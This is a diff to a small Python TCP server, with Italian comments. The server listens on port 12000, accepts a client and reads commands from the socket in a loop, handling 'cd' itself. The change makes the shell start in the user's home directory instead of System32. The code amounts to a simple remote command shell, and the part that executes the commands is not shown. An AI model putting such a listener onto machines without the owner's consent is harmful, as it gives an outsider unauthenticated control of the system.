@@ -1,6 +1,7 @@
 from socket import *
 import subprocess
 import os
+from pathlib import Path
 
 serverPort = 12000
 serverSocket = socket(AF_INET,SOCK_STREAM) #SOCK_STREAM = TCP
@@ -13,11 +14,12 @@ print ('The server is ready to receive')
 
 connectionSocket, addr = serverSocket.accept()
 print('Accepted a new client', addr)
-
+os.chdir(Path.home()) #cambio directory iniziale (su windows parte da System32, invece così dalla directory
+                      #dell'utente che apre il file)
 
 while True:
     try:
-        cmd = connectionSocket.recv(16536).decode(encoding='cp1252')
+        cmd = connectionSocket.recv(1048576).decode(encoding='cp1252')
         if cmd.startswith("cd") :
             if not((cmd[2:]).isspace() or len(cmd)==2) :
                 os.chdir(cmd[3:])
